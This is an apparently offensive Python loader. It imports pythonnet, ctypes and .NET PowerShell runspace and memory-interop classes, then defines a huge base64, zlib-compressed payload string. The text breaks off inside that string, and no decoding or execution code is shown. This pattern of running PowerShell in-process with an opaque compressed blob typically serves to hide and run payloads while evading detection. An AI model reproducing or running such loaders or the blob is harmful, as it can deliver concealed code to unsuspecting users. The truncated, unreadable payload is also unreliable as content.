import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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